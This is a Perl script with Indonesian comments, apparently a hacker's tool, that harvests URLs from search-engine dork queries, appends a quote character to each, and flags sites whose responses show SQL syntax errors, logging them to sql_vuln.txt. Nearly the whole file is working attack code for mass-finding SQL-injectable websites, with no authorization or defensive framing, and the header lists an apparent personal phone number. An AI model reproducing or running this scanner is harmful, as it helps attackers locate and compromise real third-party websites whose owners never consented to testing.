#!/usr/bin/env perl
# Author : Mr.w0n63d4n
# Di buat : 2019-05-20
# Version: V.1.0
# Merecode script atau mengganti nama author
# adalah script kiddi
# jika ingin merecode atau upload ke github
# izin ke saya
# wa contact : 08811664850

use LWP::UserAgent;
use Term::ANSIColor;
my $ua = LWP::UserAgent->new;
my %err = ("VULN" => "error in your SQL syntax",);
my @result = ();
$max = 5;
sub main{
	while(1){
		print color("reset"),"[",color("green"),"*",color("reset"),"] Masukan_Dork: ";
		$dork = <STDIN>; chomp($dork);
		for (my $i = 1; $i <= $max; $i++) {
			$target = "http://www1.search-results.com/web?q=".$dork."&tpr=1&ts=".$i;
			$req = $ua->get($target);
			$resp = $req->content;
			while ($resp =~ m/<cite..class=\"algo-display[\D]*url\">(.*)<\/cite>/g) {
				$hasil = $1."'";
				push @result, $hasil;
			}
		}
		my %has = map{$_ => 1} @result;
		my @res = keys %has;
		for (my $x = 0; $x < @res.length; $x++) {
			$targets = @res[$x];
			$reqs = $ua->get($targets);
			$respcon = $reqs->content;
			foreach $key(keys %err) {
				$f = "'";
				$rep = "";
				$targets =~ s/$f/$rep/;
				if ($respcon =~ %err{$key}) {
					open(my $vulnweb,">>","sql_vuln.txt") || do ("$!");
					say $vulnweb $targets;
					print color("reset"),"[ ",color("green"),$key,color("reset")," ] ",color("reset"),$targets,"\n",color("reset");
				}else{
					print color("reset"),"[ ",color("red"),"NOT VULN",color("reset")," ] ",$targets,"\n",color("reset");
				}
			}
		}
	}
}

print color("green"),"              __          \n";
print " .-----.-----|  |\n";
print " |__ --|  _  |  |_\n";
print " |_____|__   |____|",color("reset")," by : Mr.w0n63d4n\n",color("green");
print "          |__|\n\n"; main();
